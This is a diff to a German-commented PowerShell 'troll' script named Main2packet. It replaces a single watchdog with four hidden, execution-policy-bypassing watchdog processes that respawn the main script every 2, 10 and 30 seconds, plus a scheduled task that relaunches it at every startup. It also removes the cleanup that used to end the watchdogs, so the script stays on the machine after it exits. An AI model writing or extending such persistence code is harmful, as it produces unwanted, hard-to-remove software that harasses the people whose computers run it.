@@ -10,7 +10,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 # ===== ERROR HANDLING =====
 $ErrorActionPreference = "SilentlyContinue"
-$Host.UI.RawUI.WindowTitle = "Main2packet System"  # Unauffälliger Titel
+$Host.UI.RawUI.WindowTitle = "Main2packet System"
 
 # ===== KONFIGURATION =====
 $global:trollActive = $true
@@ -22,23 +22,62 @@ $music = [Environment]::GetFolderPath("MyMusic")
 $pictures = [Environment]::GetFolderPath("MyPictures")
 $videos = [Environment]::GetFolderPath("MyVideos")
 
-# ===== WATCHDOG =====
-$watchdogScript = @"
+# ===== TRIPLE WATCHDOG - 4 FACH GESICHERT =====
+
+# Watchdog 1 - Schnell (prüft alle 2 Sekunden)
+$watchdog1 = @"
 while(`$true) {
-    `$powershell = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.Id -ne $pid}
-    if (`$powershell.Count -eq 0) {
-        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.MainWindowTitle -like "*MAIN2PACKET*"}
+    if (`$p.Count -eq 0) { 
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`"" 
     }
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 2
 }
 "@
-$watchdogScript | Out-File "$env:TEMP\main2packet.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\main2packet.ps1`""
+$watchdog1 | Out-File "$env:TEMP\wd_schnell.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_schnell.ps1`""
+
+# Watchdog 2 - Mittel (prüft alle 10 Sekunden)
+$watchdog2 = @"
+while(`$true) {
+    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
+    if (`$p.Count -eq 0) {
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
+    }
+    Start-Sleep -Seconds 10
+}
+"@
+$watchdog2 | Out-File "$env:TEMP\wd_mittel.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_mittel.ps1`""
+
+# Watchdog 3 - Langsam (prüft alle 30 Sekunden)
+$watchdog3 = @"
+while(`$true) {
+    `$p = Get-Process powershell -ErrorAction SilentlyContinue
+    `$troll = `$p | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
+    if (`$troll.Count -eq 0) {
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
+    }
+    Start-Sleep -Seconds 30
+}
+"@
+$watchdog3 | Out-File "$env:TEMP\wd_langsam.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_langsam.ps1`""
+
+# Watchdog 4 - Startup (überlebt PC-Neustart)
+$watchdog4 = @"
+`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
+`$trigger = New-ScheduledTaskTrigger -AtStartup
+Register-ScheduledTask -TaskName "Main2packetWatchdog" -Action `$action -Trigger `$trigger -Force
+"@
+$watchdog4 | Out-File "$env:TEMP\wd_startup.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_startup.ps1`""
 
 # ===== START =====
 Clear-Host
 Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
 Write-Host "║      👑 MAIN2PACKET KING SYSTEM 👑        ║" -ForegroundColor Red
+Write-Host "║         🔒 4x WATCHDOG AKTIV!             ║" -ForegroundColor Yellow
 Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
 Write-Host ""
 Write-Host "📊 Fortschritt: 0/$global:maxRounds" -ForegroundColor Yellow
@@ -54,6 +93,7 @@ while ($global:currentRound -lt $global:maxRounds) {
         Clear-Host
         Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
         Write-Host "║      👑 MAIN2PACKET KING SYSTEM 👑        ║" -ForegroundColor Red
+        Write-Host "║         🔒 4x WATCHDOG AKTIV!             ║" -ForegroundColor Yellow
         Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
         Write-Host ""
         Write-Host "📊 Fortschritt: $global:currentRound/$global:maxRounds" -ForegroundColor Green
@@ -230,9 +270,8 @@ public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
 
 # ===== STILLES ENDE =====
-# Watchdog beenden
-Get-Process -Name "powershell" | Where-Object {$_.Id -ne $pid} | Stop-Process -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\main2packet.ps1" -Force -ErrorAction SilentlyContinue
+# Watchdogs laufen weiter! Nur hier wird der Hauptprozess beendet
+# Die 4 Watchdogs bleiben aktiv und starten alles neu!
 
 # Still beenden
 exit
